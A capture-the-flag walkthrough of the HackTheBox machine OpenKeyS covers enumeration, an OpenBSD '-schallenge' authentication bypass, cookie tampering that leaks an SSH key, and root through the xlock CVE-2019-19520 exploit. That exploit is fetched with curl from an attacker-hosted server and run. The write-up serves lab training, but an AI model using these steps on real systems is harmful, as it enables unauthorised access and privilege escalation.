@@ -1,0 +1,108 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">OpenKeyS HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/openkeys-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-02-17T19:57:41+00:00">February 17, 2021</time><time class="updated" datetime="2025-06-22T12:54:27+00:00">June 22, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we are going to crack a machine called OpenKeyS. It was created by <span style="color: #0000ff;"><strong>polarbearer</strong></span> &amp; <span style="color: #0000ff;"><strong>GibParadox.</strong></span> This is a Capture the Flag type of challenge. This machine is hosted on HackTheBox. Let’s get cracking!</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Network Scanning</strong></span>
+<ul>
+<li><span style="color: #000000;">Nmap Scan</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Enumeration</strong></span>
+<ul>
+<li><span style="color: #000000;">Browsing HTTP Service</span></li>
+<li><span style="color: #000000;">Directory Bruteforce using gobuster</span></li>
+<li><span style="color: #000000;">Exploiting Directory Listing</span></li>
+<li><span style="color: #000000;">Enumerating vi swap file</span></li>
+<li><span style="color: #000000;">Enumerating users and directory from auth.php</span></li>
+<li><span style="color: #000000;">Downloading check_auth file</span></li>
+<li><span style="color: #000000;">Analyzing the check_auth file</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Exploitation</strong></span>
+<ul>
+<li><span style="color: #000000;">Authentication bypass using -schallenge</span></li>
+<li><span style="color: #000000;">Manipulating cookie for OpenSSH key</span></li>
+<li><span style="color: #000000;">Downloading OpenSSH key</span></li>
+<li><span style="color: #000000;">Logging as jennifer user</span></li>
+<li><span style="color: #000000;">Reading User Flag</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Privilege Escalation</strong></span>
+<ul>
+<li><span style="color: #000000;">Enumerating OpenBSD version</span></li>
+<li><span style="color: #000000;">Exploiting xlock to get root</span></li>
+<li><span style="color: #000000;">Reading the Root Flag</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
+<p><span style="color: #000000;">IP Address assigned: <strong>10.129.39.140</strong></span></p>
+<p><span style="color: #000000;">Now that we have the IP Address. We need to enumerate open ports on the machine. For this, we will be running a nmap scan.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sC -sV 10.129.39.140</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DoOdzzTzNo8/YC1yI18Cp6I/AAAAAAAAt1k/s48w7__IHb8altNTR9bixYHbSO7BcNkhgCLcBGAsYHQ/s16000/1.png"/></span></p>
+<p><span style="color: #000000;">The Nmap Version scan quickly gave us some great information. It positively informed that the following ports and services are running: 22 (SSH), 80 (HTTP).</span></p>
+<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
+<p><span style="color: #000000;">Since we don’t have any credentials for the ssh service, we will start our enumeration with the HTTP service. We open the IP Address in the web browser. We find a login page. Here, we tried some default credentials but we weren’t able to get in.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.39.140</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JXViQQ7kkqY/YC1yUcXWEKI/AAAAAAAAt1o/-VKG8anUP_ok2BLdyTlCLwo8zBlSiTQ7ACLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">We shifted our focus to performing a Directory Bruteforce using gobuster. The gobuster revealed a directory called /includes.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">gobuster dir -u http://10.129.39.140 -w /usr/share/wordlists/dirb/common.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-MPFDIss--Ss/YC1yYzZpdyI/AAAAAAAAt1w/jWiM36OfwswMGKbi1LnXL_2_ENjR2mLEQCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">Upon opening the includes directory in the browser we see that we have two files listed here. One is auth.php and one is auth.php.swp.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.39.140/includes/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RYRVszt3zLw/YC1yd3TZhoI/AAAAAAAAt10/ZWH9eDf_KvYHDp-_34u6EnilYHdl-KQ7wCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">We download both the files on our local system to properly inspect them. The auth.php file was empty. That is not surprising as we have a vim swap file with it. It means that the author of the php file was in the process of creating/editing the file but vim couldn’t properly save it due to some unknown reason. We check the contents of the swap file using strings. This file discloses a username: jennifer and another directory called auth_helpers and a file inside it that checks the authentication on the initial login form.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">strings auth.php.swp</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-copV_nJ_5tQ/YC1yiqh6UHI/AAAAAAAAt14/l2akQRAFDzQiyb9q0NEPLrjmzQL-CRmKgCLcBGAsYHQ/s16000/5.png"/></span></p>
+<p><span style="color: #000000;">Since this is a swap file, we can recover the code completely. We need to run the recover option of vim.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">vim -r auth.php.swp</pre>
+<p><span style="color: #000000;">Here we have the recovered auth.php code.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CEAbY3aTwYw/YC1ysjV-jbI/AAAAAAAAt2A/BkanxfNznrUWeWqqpJCcJni3CuSTMYqXgCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">Since the php uses the check_auth file to check the authentication, we can download it by browsing the auth_helpers directory in our browser.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://10.129.39.140/auth_helpers</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HFokfckRv_A/YC1yxflWOPI/AAAAAAAAt2I/1x10LHBSF-UgTZVXWXL6d7Ni1ly8KjdrACLcBGAsYHQ/s16000/8.png"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Since the target machine is running OpenBSD and this check_auth is an ELF we can direction our enumeration in the direction of OpenBSD and bypassing authentication. We went on a search spree which included vulnerabilities, manuals and research papers.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">file check_auth</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dIM_iJYgyTc/YC1y6vRoxRI/AAAAAAAAt2Q/ga8hfhd4jpI0AQtSqybGC3JIlIB2x5fywCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">This is when we stumbled upon a <a style="color: #000000;" href="https://nakedsecurity.sophos.com/2019/12/06/openbsd-devs-patch-authentication-bypass-bug/"><span style="color: #0000ff;"><strong>Naked Security article</strong></span></a>. It told us that the Authentication Bypass vulnerability automatically allows anyone accessing the application via the password as any text as long as it is with the username -schallenge. The hyphen symbol makes the operating system to interpret the word as a command. The -schallenge option basically grants user access automatically. So, we entered -schallenge in the form as shown in the image below.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GqVdkm0SzzY/YC1zDb4tqDI/AAAAAAAAt2c/GYvZQBCoDN0--WrZPe64PhqkVQFKrp7zwCLcBGAsYHQ/s16000/10.png"/></span></p>
+<p><span style="color: #000000;">When we logged in, it gave us the error of the OpenSSH key. Basically, it is a failsafe designed if the attacker tries to use the -schallenge method. Luckily, this can be bypassed as well.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-udeieKE6vhY/YC1zINq5grI/AAAAAAAAt2g/slOXXvxc2D8rZnkWfqm7wHr2sHLyuHYYgCLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">This is more of manipulation to make the target machine believe that it should provide us with the OpenSSH key. To do this we intercepted the request in BurpSuite. We know that jennifer is one of the users on the machine. This means we will have to ask for Jennifer’s SSH key. We tried manipulating the URL and sending jennifer as a keyword. It didn’t work. Then it hit us the error says that key was not found. This means it was expecting some value in the form of a key. So maybe if we manipulate the cookie that was generated with the authentication page and insert jennifer into it. We could bypass it and get the key for jennifer.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OD-cniZtIBQ/YC1zL8msbwI/AAAAAAAAt2o/-OBvhXxbEHMWn3FiSv1avN0zezWEyx_dQCLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">As soon as we sent the request with the manipulated cookie, we got the OpenSSH key for the user jennifer.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wAeCvJfCbZo/YC1zPwyyjjI/AAAAAAAAt2s/zYX1wDv1efU0eGyAaXsPIymgsOkXTHmZACLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">We saved the contents of OpenSSH key into a file and then after giving it proper permissions, we used it to login into the target machine as the user jennifer. One of the first things we did was to try and locate the user flag and then read it.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i key jennifer@10.129.39.140
+cat user.txt
+uname -a</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ToJeJAWx4Pw/YC1zVGFMCyI/AAAAAAAAt20/00A5P0cgtYwSbv5iJvFTxqmFBHTW52jygCLcBGAsYHQ/s16000/14.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">After reading the user flag, we check the version of the OpenBSD to figure out methods to escalate privilege. We found that it is running OpenBSD version 6.6. Time to get on some enumeration. After looking for a while we found the xlock Privilege Escalation. In this, we can upgrade a local user to gain privilege which is a part of the auth group by providing it with a LIBGL_DRIVERS_PATH environment variable. It is possible to elevate this privilege due to xenocara/lib/mesa/src/loader/loader.c mishandles dlopen. If it gets complex no need to bother, we searched and found an exploit for it. It can download it from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot">here</a></strong></span>. We created a file by the name of authroot.sh and transferred the file to the target machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano authroot.sh
+python -m SimpleHTTPServer</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NijYZZmVNGo/YC1zZZk_jlI/AAAAAAAAt24/Yu1KK3OWNMAm0oPYAwsiUKedoWZgIy2dACLcBGAsYHQ/s16000/15.png"/></span></p>
+<p><span style="color: #000000;">Then, we used curl to download the file on the target machine. We provided the proper permission to the script and executed it. In a few moments, it gave us the password for the root user.</span></p>
+<p><span style="color: #000000;">At the end of the exploit, it asked for the S/Key password we entered the above password and it got us to root privileges which we checked using id command. Now all that is left is to read the root flag inside the /root directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl -O http://10.10.14.64:8000/authroot.sh
+chmod 777 authroot.sh
+./authroot.sh
+EGG LARD GROW HOG DRAG LAIN
+id
+cat /root/root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9L09mmo9CLE/YC1zdiRea8I/AAAAAAAAt3A/Np2JDyTZxHkENp0OoBbQlU6TpdZAN2hcQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
